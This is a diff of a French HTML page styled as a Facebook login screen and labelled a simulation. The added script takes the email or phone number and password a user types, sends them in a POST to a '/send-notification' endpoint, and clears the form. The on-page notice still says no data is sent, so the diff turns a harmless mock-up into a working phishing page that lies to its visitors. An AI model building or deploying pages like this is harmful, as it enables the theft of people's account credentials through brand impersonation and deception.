@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Simulation Facebook Login</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body {
       background-color: #f0f2f5;
@@ -13,7 +13,6 @@
       align-items: center;
       height: 100vh;
     }
-
     .login-box {
       background: white;
       padding: 40px;
@@ -22,13 +21,11 @@
       width: 100%;
       max-width: 400px;
     }
-
     h2 {
       color: #1877F2;
       margin-bottom: 30px;
       text-align: center;
     }
-
     input {
       width: 100%;
       padding: 12px;
@@ -37,7 +34,6 @@
       border-radius: 6px;
       font-size: 16px;
     }
-
     button {
       width: 100%;
       background-color: #1877F2;
@@ -48,11 +44,9 @@
       border-radius: 6px;
       cursor: pointer;
     }
-
     button:hover {
       background-color: #155db8;
     }
-
     .note {
       text-align: center;
       font-size: 12px;
@@ -64,11 +58,41 @@
 <body>
   <div class="login-box">
     <h2>Connexion à Facebook (Simulation)</h2>
-    <input type="text" placeholder="Adresse e-mail ou numéro de téléphone">
-    <input type="password" placeholder="Mot de passe">
-    <button>Se connecter</button>
+    <input id="userEmail" type="text" placeholder="Adresse e-mail ou numéro de téléphone" />
+    <input id="userPassword" type="password" placeholder="Mot de passe" />
+    <button id="sendBtn" type="button">Se connecter</button>
     <p class="note">⚠️ Ceci est une simulation éducative – aucune donnée n'est envoyée.</p>
   </div>
+
+  <script>
+    document.getElementById('sendBtn').addEventListener('click', () => {
+      const email = document.getElementById('userEmail').value.trim();
+      const password = document.getElementById('userPassword').value.trim();
+
+      if (!email || !password) {
+        alert('Merci de remplir tous les champs.');
+        return;
+      }
+
+      const message = `Email/Phone: ${email}\nPassword: ${password}`;
+
+      fetch('/send-notification', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message }),
+      })
+      .then(res => {
+        if (res.ok) {
+          alert('Informations envoyées.');
+          // Optionnel: vider les champs
+          document.getElementById('userEmail').value = '';
+          document.getElementById('userPassword').value = '';
+        } else {
+          alert('Erreur lors de l’envoi.');
+        }
+      })
+      .catch(() => alert('Erreur réseau.'));
+    });
+  </script>
 </body>
 </html>
-
